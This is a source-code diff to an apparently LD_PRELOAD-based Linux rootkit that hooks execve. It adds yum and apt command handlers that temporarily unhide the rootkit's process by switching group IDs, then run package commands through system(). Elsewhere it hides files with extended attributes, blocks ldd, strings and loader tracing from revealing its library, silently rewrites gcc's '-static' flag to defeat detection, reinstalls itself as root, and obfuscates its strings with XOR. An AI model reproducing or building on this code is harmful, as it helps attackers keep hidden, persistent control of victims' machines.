@@ -6,7 +6,52 @@
 // I'll also be tidying up bits here and there, so the final form (lol nice joke loser)
 // probably will look somewhat clean anyway
 
-// if you want to add your own commands in here, just try to follow the same structure as the default commands
+// if you want to add your own commands in here, just try to follow the same structure as the default commands, it helps
+
+// saves me hardcoding in usage instructions for each command
+char *busage(char *path, char **uoptions, int sopt)
+{
+    // not a fan of the way i'm doing this, but it works
+    char *opts = (char *)malloc(128);
+    char _opts[128], *ret = (char *)malloc(256);
+    int i=0;
+    do // eaier than using a for loop
+    {
+        char *copt = strdup(uoptions[i]); xor(copt);
+        snprintf(_opts, sizeof(_opts), "%s/", copt);
+        CLEAN(copt);
+        strcat(opts, _opts);
+        i += 1; // yeah yeah i know
+    }while(uoptions[i] != NULL);
+    opts[strlen(opts) - 1] = 0; // remove the trailing '/' character from the built string
+
+    // size may be a little over the actual necessary size, but only by a tiny amount
+    char *x_usage = strdup(X_USAGE); xor(x_usage);
+    snprintf(ret, strlen(x_usage) + strlen(path) + strlen(opts), x_usage, path, opts);
+    CLEAN(x_usage); return ret;
+}
+
+// unhide when needed.
+// char *c_wrning is usually taken from const.h,
+// named *_WARNING (i.e. APT_WARNING, YUM_WARNING),
+// it is the warning string that will show before prompting enter be pressed.
+void unhide_proc(char *c_wrning)
+{
+    // show user warning
+    char c = 0, *wrning = strdup(c_wrning); xor(wrning);
+    printf("%s", wrning); CLEAN(wrning);
+
+    // wait until newline char is received
+    while(c != '\n') c = getchar();
+
+    // relocate
+    chdir("/");
+
+    HOOK(old_setgid, CSETGID);
+    char *sccss = strdup(GID_SET); xor(sccss);
+    printf("%s", sccss); CLEAN(sccss);
+    old_setgid(0); // finally, unhide
+}
 
 int execve(const char *filename, char *const argv[], char *const envp[])
 {
@@ -34,81 +79,87 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                 HOOK(old_setxattr, CSETXATTR);
                 HOOK(old_removexattr, CREMOVEXATTR);
 
+                char *yum = strdup(YUM); xor(yum);
+                if(strstr(filename, yum))
+                {
+                    CLEAN(yum);
+
+                    // build yum usage
+                    char *yum_usage = busage(argv[0], yum_options, YUM_OPT_SIZE);
+                    if(argv[2] == NULL) { printf("%s", yum_usage); exit(0); } // show usage and exit if no operation argument is given
+                    int s = 0;
+                    for(int i=0;i<YUM_OPT_SIZE;i++) if(!strcmp(argv[2], apt_options[i])) s = 1; // check if a valid operation was given
+                    if(!s) { printf("%s", yum_usage); exit(0); } // show usage and exit if not
+
+                    // get the cwd for later and assume a normal user
+                    char old_cwd[512];
+                    getcwd(old_cwd, sizeof(old_cwd));
+                    unhide_proc(YUM_WARNING);
+
+                    // this system i have now is so much better than previous versions. don't know why i haven't done this before now
+                    for(int i=0;i<YUM_COM_SIZE;i++)
+                    {
+                        char *c_opt = strdup(yum_options[i]); xor(c_opt);
+                        if(!strcmp(argv[2], c_opt)) // match found??
+                        {
+                            char *ex = strdup(yum_commands[i]); xor(ex); // the two arrays have relative indexes between command names and commands themselves
+                            if(strstr(ex, "%%s")) // does the command require a third argument?
+                            {// if so, take the third argument into consideration
+                                char buf[128];
+                                snprintf(buf, sizeof(buf), ex, argv[3]);
+                                system(buf);
+                            }else system(ex); // since not, just do a simple
+                            CLEAN(ex); CLEAN(c_opt); break; // no point in still looping after this
+                        }
+                        CLEAN(c_opt);
+                    }
+
+                    old_setgid(MAGIC_GID); // rehide after calling unhide_proc
+
+                    char *yum_success = strdup(E_SMSG); xor(yum_success);
+                    printf(yum_success, argv[0]); CLEAN(yum_success);
+                    chdir(old_cwd); exit(0);
+                }
+
                 char *apt = strdup(APT); xor(apt);
                 if(strstr(filename, apt))
                 {
                     CLEAN(apt);
-                    char *apt_update = strdup(APT_UPDATE); xor(apt_update);
-                    char *apt_install = strdup(APT_INSTALL); xor(apt_install);
-                    char *apt_remove = strdup(APT_REMOVE); xor(apt_remove);
 
-                    if(argv[2] == NULL || // no argument given at all after the password?
-                      (strcmp(argv[2], apt_update) && strcmp(argv[2], apt_install) && strcmp(argv[2], apt_remove)) || // none of the predetermined arguments?
-                      (strcmp(argv[2], apt_update) && argv[3] == NULL)) // install/remove argument but no 'package' argument given?
+                    // build apt usage
+                    char *apt_usage = busage(argv[0], apt_options, APT_OPT_SIZE);
+                    if(argv[2] == NULL) { printf("%s", apt_usage); exit(0); }
+                    int s = 0;
+                    for(int i=0;i<APT_OPT_SIZE;i++) if(!strcmp(argv[2], apt_options[i])) s = 1;
+                    if(!s) { printf("%s", apt_usage); exit(0); } // apt will handle messages if no third argument is given for install
+
+                    // looking at this, i want to make process unhiding & hiding generally safer and more difficult for third parties
+                    char old_cwd[512];
+                    getcwd(old_cwd, sizeof(old_cwd));
+                    unhide_proc(APT_WARNING);
+
+                    for(int i=0;i<APT_COM_SIZE;i++)
                     {
-                        char *apt_usage = strdup(APT_USAGE); xor(apt_usage);
-                        printf("%s", apt_usage);
-
-                        CLEAN(apt_update);
-                        CLEAN(apt_install);
-                        CLEAN(apt_remove);
-                        CLEAN(apt_usage);
-                        exit(0);
+                        char *c_opt = strdup(apt_options[i]); xor(c_opt);
+                        if(!strcmp(argv[2], c_opt))
+                        {
+                            char *ex = strdup(apt_commands[i]); xor(ex);
+                            if(strstr(ex, "%%s"))
+                            {
+                                char buf[64];
+                                snprintf(buf, sizeof(buf), ex, argv[3]);
+                                system(buf);
+                            }else system(ex);
+                            CLEAN(ex); CLEAN(c_opt); break;
+                        }
+                        CLEAN(c_opt);
                     }
 
-                    printf("running ./apt with option %s\n", argv[2]);
+                    old_setgid(MAGIC_GID);
 
-                    // warnings, etc
-                    // thinking about making a macro to xor strings, print them and clean up
-                    // 23/10/2016 done lol^^
-                    char c = 0, *apt_warning = strdup(APT_WARNING); xor(apt_warning);
-                    printf("%s", apt_warning);
-                    CLEAN(apt_warning);
-                    while(c != '\n') c = getchar(); // we're on linux.. so we only need to check for \n, no \r
-
-                    char old_cwd[666]; // 666 hahahaha hail satan
-                    getcwd(old_cwd, sizeof(old_cwd)); // there's not really any point in checking if this will return NULL
-                    chdir("/"); // if the user's in a hidden directory, not much will work, let's just temporarily cd /
-
-                    HOOK(old_setgid, CSETGID);
-                    char *apt_gid_set = strdup(APT_GID_SET); xor(apt_gid_set);
-                    printf("%s", apt_gid_set);
-                    CLEAN(apt_gid_set);
-                    old_setgid(0); // PROCESS IS NOW UNHIDDEN
-
-                    // yeah, i used system()
-                    // so what bitch
-                    if(!strcmp(argv[2], apt_update))
-                    {
-                        char *apt_update_cmd = strdup(APT_UPDATE_CMD); xor(apt_update_cmd);
-                        int sret = system(apt_update_cmd);
-                        CLEAN(apt_update_cmd);
-                        printf("return value of system() for apt_update condition: %d\n", sret);
-                    }else if(!strcmp(argv[2], apt_install))
-                    {
-                        char apt_install_c[64], *apt_install_cmd = strdup(APT_INSTALL_CMD); xor(apt_install_cmd);
-                        snprintf(apt_install_c, sizeof(apt_install_c), apt_install_cmd, argv[3]);
-                        CLEAN(apt_install_cmd);
-                        int sret = system(apt_install_c);
-                        printf("return value of system() for apt_install condition: %d\n", sret);
-                    }else if(!strcmp(argv[2], apt_remove))
-                    {
-                        char apt_rm_c[64], *apt_remove_cmd = strdup(APT_REMOVE_CMD); xor(apt_remove_cmd);
-                        snprintf(apt_rm_c, sizeof(apt_rm_c), apt_remove_cmd, argv[3]);
-                        CLEAN(apt_remove_cmd);
-                        int sret = system(apt_rm_c);
-                        printf("return value of system() for apt_remove condition: %d\n", sret);
-                    }
-
-                    old_setgid(MAGIC_GID); // reset the magic GID so we can hide again :3
-                    char *apt_success = strdup(APT_SUCCESS); xor(apt_success);
-                    printf("%s", apt_success);
-                    CLEAN(apt_success);
-                    chdir(old_cwd);
-                    CLEAN(apt_update);
-                    CLEAN(apt_install);
-                    CLEAN(apt_remove);
-                    exit(0);
+                    char *apt_success = strdup(E_SMSG); xor(apt_success);
+                    printf(apt_success, argv[0]); CLEAN(apt_success);
+                    chdir(old_cwd); exit(0);
                 }
                 CLEAN(apt);
 
@@ -130,14 +181,12 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                     if((strstr(target_file, install) || strstr(target_file, ld_preload_etc)) && hidden_xattr(target_file))
                     {
                         printf("Try to unhide that again and I'll fucking kill you.\n");
-                        CLEAN(ld_preload_etc); CLEAN(install);
-                        exit(0);
+                        CLEAN(ld_preload_etc); CLEAN(install); exit(0);
                     }
                     CLEAN(ld_preload_etc); CLEAN(install);
 
-                    char xattr_user[256];
+                    char *xattr = strdup(XATTR), xattr_user[256];
                     char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR);
-                    char *xattr = strdup(XATTR);
 
                     xor(hidden_xattr_1_str); xor(xattr);
                     snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str); // create user.blahblahblah attribute to hide the file
@@ -150,8 +199,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
 
                     char *unhide_success = strdup(UNHIDE_SUCCESS); xor(unhide_success);
                     printf(unhide_success, target_file);
-                    CLEAN(unhide_success);
-                    exit(0);
+                    CLEAN(unhide_success); exit(0);
                 }
                 CLEAN(unhide_file);
 
@@ -171,11 +219,9 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                     char *hidden_xattr_2_str = strdup(HIDDEN_XATTR_2_STR);
                     char *xattr = strdup(XATTR);
 
-                    xor(hidden_xattr_1_str);
-                    xor(xattr);
+                    xor(hidden_xattr_1_str); xor(xattr);
                     snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str);
-                    CLEAN(xattr);
-                    CLEAN(hidden_xattr_1_str);
+                    CLEAN(xattr); CLEAN(hidden_xattr_1_str);
 
                     xor(hidden_xattr_2_str);
                     int ret = old_setxattr(target_file, xattr_user, hidden_xattr_2_str, strlen(hidden_xattr_2_str), XATTR_CREATE);
@@ -186,8 +232,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
 
                     char *hide_success = strdup(HIDE_SUCCESS); xor(hide_success);
                     printf(hide_success, target_file);
-                    CLEAN(hide_success);
-                    exit(0);
+                    CLEAN(hide_success); exit(0);
                 }
                 CLEAN(hide_file);
 
@@ -234,6 +279,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
         else if(check_curr_proc == 0) { errno = EIO; return -1; }
         else if(check_curr_proc == -1) return -1;
         else if(check_curr_proc == 2) return old_execve(filename, argv, envp);
+        else continue; // don't /really/ have to have this here... but it's here
     }
 
     char *ld_linux_so_path = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so_path);
@@ -249,11 +295,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
             {
                 CLEAN(ld_so_path); CLEAN(ld_linux_so_path);
 
-                if(getuid() != 0 && geteuid() != 0)
-                {
-                    CLEAN(ld_preload);
-                    errno = EIO; return -1;
-                }
+                if(getuid() != 0 && geteuid() != 0) { CLEAN(ld_preload); errno = EIO; return -1; }
 
                 old_unlink(ld_preload);
                 CLEAN(ld_preload);
@@ -283,11 +325,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
             CLEAN(ld_audit_env_var);
             CLEAN(ld_audit_getenv);
 
-            if(getuid() != 0 && geteuid() != 0)
-            {
-                CLEAN(ld_preload);
-                errno = EIO; return -1;
-            }
+            if(getuid() != 0 && geteuid() != 0) { CLEAN(ld_preload); errno = EIO; return -1; }
 
             old_unlink(ld_preload);
             CLEAN(ld_preload);
@@ -295,8 +333,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
             if((pid = fork()) == -1) return -1;
             else if(pid == 0) return old_execve(filename, argv, envp);
 
-            wait(&ret); reinstall();
-            exit(0);
+            wait(&ret); reinstall(); exit(0);
         }
         CLEAN(ld_trace_env_var);
         CLEAN(ld_debug_env_var);
@@ -311,8 +348,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
         if(getenv(ld_preload_env) && strstr(envp[i], libc_path)) // don't look at me!! i'm naked!!
         {
             CLEAN(ld_preload_env); CLEAN(libc_path);
-            errno = EPERM; // permission error seems suitable for this. LIBC BROKE MY PERMISSIONS OH NO!!
-            return -1;
+            errno = EPERM; return -1; // permission error seems suitable for this. LIBC BROKE MY PERMISSIONS OH NO!!
         }
     }
     CLEAN(ld_preload_env);
@@ -321,29 +357,18 @@ int execve(const char *filename, char *const argv[], char *const envp[])
     if(argv[0] != NULL && strstr(argv[0], "strings"))
     {
         char *lib_name = strdup(LIB_NAME); xor(lib_name);
-        for(i = 0; argv[i] != NULL; i++)
+        for(i=0; argv[i] != NULL;i++)
         {
             if(strstr(argv[i], lib_name) || strstr(argv[i], "ld-2")) // strstr and not strcmp because it could be a full path
             {
                 CLEAN(lib_name);
-                errno = EIO;
-                return -1;
+                errno = EPERM; return -1;
             }
         }
         CLEAN(lib_name);
     }
 
-    // no point in hiding these strings, it's not really sensitive data
-    if(argv[0] != NULL && strstr(argv[0], "gcc"))
-    {
-        for(i = 0; argv[i] != NULL; i++)
-        {
-            if(!strcmp(argv[i], "-static")){
-                errno = ENOMEM;
-                return -1;
-            }
-        }
-    }
+    if(argv[0] != NULL && strstr(argv[0], "gcc")) for(i=0; argv[i] != NULL;i++) if(!strcmp(argv[i], "-static")) strncpy(argv[i], "-Wvarargs", strlen("-Wvarargs"));
 
     if(geteuid() == 0) reinstall();
 
